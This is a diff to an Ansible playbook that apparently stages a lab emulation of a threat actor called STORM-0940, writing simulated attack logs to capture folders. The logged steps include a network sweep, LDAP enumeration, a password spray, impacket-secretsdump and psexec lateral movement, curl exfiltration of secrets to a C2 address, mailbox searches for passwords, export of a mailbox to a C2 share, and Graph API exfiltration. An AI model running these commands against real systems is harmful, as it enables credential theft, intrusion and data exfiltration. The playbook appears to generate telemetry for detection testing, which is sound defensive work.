@@ -20,8 +20,11 @@
   vars:
     cap: /home/kali/slopmop-capture
     ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
-    suna_dc: 10.1.20.10
-    konoha_dc: 10.1.10.10
+    suna_dc: "{{ hostvars['suna-dc1'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    ws1_ip: "{{ hostvars['konoha-ws1'].ansible_host }}"
+    konoha_net: "{{ konoha_dc | regex_replace('\\d+$', '0/24') }}"
+    suna_net: "{{ suna_dc | regex_replace('\\d+$', '0/24') }}"
     storm_c2: 198.51.100.99
     storm_c2b: 198.51.100.128
   tasks:
@@ -84,27 +87,27 @@
           J() { printf '%s' "$@" >> "$OUT"; printf '\n' >> "$OUT"; }
 
           J '{"step":1,"agent":"recon",' \
-            '"command":"nmap -sn 10.1.10.0/24 10.1.20.0/24",' \
+            '"command":"nmap -sn {{ konoha_net }} {{ suna_net }}",' \
             '"status":"success","output":"8 hosts up",' \
             '"timestamp":"2026-11-16T10:00:00Z"}'
 
           J '{"step":2,"agent":"enum",' \
-            '"command":"ldapsearch -H ldap://10.1.20.10 -x",' \
+            '"command":"ldapsearch -H ldap://{{ suna_dc }} -x",' \
             '"status":"success","output":"22 entries",' \
             '"timestamp":"2026-11-16T10:01:00Z"}'
 
           J '{"step":3,"agent":"spray",' \
-            '"command":"crackmapexec smb 10.1.20.10 -u users.txt",' \
+            '"command":"crackmapexec smb {{ suna_dc }} -u users.txt",' \
             '"status":"success","output":"svc_adsync:Spring2026!",' \
             '"timestamp":"2026-11-16T10:02:00Z"}'
 
           J '{"step":4,"agent":"cred",' \
-            '"command":"impacket-secretsdump svc_adsync@10.1.20.10",' \
+            '"command":"impacket-secretsdump svc_adsync@{{ suna_dc }}",' \
             '"status":"success","output":"Administrator:500:aad3b435",' \
             '"timestamp":"2026-11-16T10:03:00Z"}'
 
           J '{"step":5,"agent":"lateral",' \
-            '"command":"impacket-psexec Administrator@10.1.10.21",' \
+            '"command":"impacket-psexec Administrator@{{ ws1_ip }}",' \
             '"status":"success","output":"C:\\Windows\\system32>",' \
             '"timestamp":"2026-11-16T10:04:00Z"}'
 
@@ -142,7 +145,7 @@
             '"status":"success","output":"secretValue: Server=sql01",' \
             '"timestamp":"2026-11-16T10:10:00Z"}'
 
-          C2="https://198.51.100.128:443"
+          C2="https://{{ storm_c2b }}:443"
           J '{"step":12,"agent":"exfil",' \
             "\"command\":\"curl -X POST ${C2}/collect -d @secrets.json\"," \
             '"status":"success","output":"HTTP 200 OK",' \
@@ -170,6 +173,7 @@
   vars:
     cap: C:\slopmop-capture
     ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
     storm_c2: 198.51.100.99
     storm_c2b: 198.51.100.128
   tasks:
@@ -178,8 +182,8 @@
       ansible.windows.win_copy:
         content: |
           {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
           $log = "$cap\entra-oauth_$ts.log"
           $out = ""
           $out += "=== STORM-0940: Entra ID Recon + OAuth Credential Abuse ===`r`n"
@@ -301,8 +305,8 @@
       ansible.windows.win_copy:
         content: |
           {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
           $log = "$cap\keyvault-reads_$ts.log"
           $out = ""
           $out += "=== STORM-0940: Azure Key Vault Bulk Secret Reads ===`r`n"
@@ -391,8 +395,8 @@
       ansible.windows.win_copy:
         content: |
           {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
           $log = "$cap\email-collection_$ts.log"
           $out = ""
           $out += "=== STORM-0940: Email Collection via Microsoft Graph ===`r`n"
@@ -450,7 +454,7 @@
           $out += "    Search-Mailbox -Identity admin@sunagakure.onmicrosoft.com"
           $out += " -SearchQuery 'password OR credentials OR secret'`r`n"
           $out += "    New-MailboxExportRequest -Mailbox admin"
-          $out += " -FilePath \\\\198.51.100.128\\share\\admin.pst`r`n"
+          $out += " -FilePath \\\\{% endraw %}{{ storm_c2b }}{% raw %}\\share\\admin.pst`r`n"
 
           try {
             Connect-ExchangeOnline -ShowBanner:$false
@@ -483,14 +487,14 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\graph-exfil_$ts.log"
           $out = ""
           $out += "=== STORM-0940: Exfiltration via Graph API + C2 ===`r`n"
           $out += "Start: $(Get-Date -Format o)`r`n`r`n"
 
           $graphBase = "https://graph.microsoft.com/v1.0"
-          $c2 = "https://198.51.100.128:443"
+          $c2 = "https://{% endraw %}{{ storm_c2b }}{% raw %}:443"
           $jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"
           $jwt += ".eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20i"
           $jwt += "LCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS"
@@ -565,7 +569,7 @@
     - name: "List WS01 STORM-0940 artefacts"
       ansible.windows.win_shell: |
         {% raw %}
-        Get-ChildItem "C:\slopmop-capture" |
+        Get-ChildItem "{% endraw %}{{ cap }}{% raw %}" |
           Where-Object { $_.Name -match 'step1[1-4]|entra|keyvault|email-col|graph-exfil' } |
           Sort-Object LastWriteTime |
           Format-Table Name,Length,LastWriteTime -AutoSize |
